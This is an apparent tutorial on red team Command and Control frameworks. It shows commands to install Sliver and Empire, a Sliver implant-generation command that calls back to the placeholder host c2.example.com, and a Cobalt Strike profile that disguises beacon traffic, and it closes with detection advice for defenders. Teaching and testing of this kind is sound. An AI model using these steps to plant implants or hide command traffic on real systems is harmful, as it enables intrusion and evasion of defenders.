[{"order":1,"type":"heading","text":"Technical Tutorial: Command and Control (C2) Frameworks in Ethical Hacking"},{"order":2,"type":"paragraph","text":"Command and Control (C2) frameworks are critical infrastructure used during Red Team engagements and advanced penetration tests to simulate adversary behaviors. This tutorial explores the architecture, deployment, and practical usage of three prominent C2 frameworks: Cobalt Strike, Sliver, and PowerShell Empire."},{"order":3,"type":"subheading","text":"1. Understanding C2 Architecture"},{"order":4,"type":"paragraph","text":"A standard C2 infrastructure consists of two primary components: the Team Server (or Listener) and the Client (Operator Interface), communicating with a Payload (Implant/Agent) running on the target machine."},{"order":5,"type":"bullet_point","text":"Team Server: The central hub that manages incoming connections, coordinates operators, and handles exfiltrated data."},{"order":6,"type":"bullet_point","text":"Implant/Agent: The software executed on the target host that calls back to the Team Server at configured intervals."},{"order":7,"type":"bullet_point","text":"Listeners: Network services configured on the Team Server to receive callbacks using protocols such as HTTP, HTTPS, DNS, or TCP."},{"order":8,"type":"subheading","text":"2. Open-Source Alternative: Setting Up Sliver C2"},{"order":9,"type":"paragraph","text":"Sliver, developed by Bishop Fox, is an open-source, Go-based cross-platform C2 framework designed for adversary simulation. Below is a guide to initializing a Sliver server securely."},{"order":10,"type":"code","text":"sudo apt update && sudo apt install -y curl
curl https://sliver.sh/install | bash
sliver-server"},{"order":11,"type":"paragraph","text":"Once inside the Sliver interactive shell, you can generate a mutual TLS (mTLS) implant to execute on a target system for authorized testing."},{"order":12,"type":"code","text":"generate --mtls c2.example.com --os windows --arch amd64 --save /opt/sliver/payloads/"},{"order":13,"type":"subheading","text":"3. PowerShell Empire and Starkiller GUI"},{"order":14,"type":"paragraph","text":"Empire is a post-exploitation framework that includes a PowerShell-agent agent and a Python-based server. Starkiller provides a modern Electron-based GUI interface for managing Empire instances."},{"order":15,"type":"code","text":"git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh
./empire"},{"order":16,"type":"paragraph","text":"After launching Empire, you configure listeners and generate staging payloads to interact with target environments safely and audit defensive controls."},{"order":17,"type":"subheading","text":"4. Commercial Standard: Cobalt Strike Overview"},{"order":18,"type":"paragraph","text":"Cobalt Strike is a commercial adversary simulation and Red Team operations software. Its 'Beacon' payload is industry-renowned for flexible malleability, allowing operators to blend network traffic with legitimate enterprise protocols."},{"order":19,"type":"code","text":"http-config {
    header "Server" "Microsoft-IIS/10.0";
    uri "/iisstart.png";
}"},{"order":20,"type":"subheading","text":"5. Detection and Defensive Engineering"},{"order":21,"type":"paragraph","text":"Security Operations Centers (SOCs) detect C2 frameworks by analyzing network telemetry and endpoint anomalies. Blue Teams should implement the following defensive strategies:"},{"order":22,"type":"bullet_point","text":"Monitor abnormal beaconing intervals and long-duration TLS connections."},{"order":23,"type":"bullet_point","text":"Inspect PowerShell execution logs (Event ID 4104) for obfuscated Empire or custom scripts."},{"order":24,"type":"bullet_point","text":"Deploy Endpoint Detection and Response (EDR) solutions to flag process injection and reflective DLL loading commonly used by Beacon and Sliver."}]
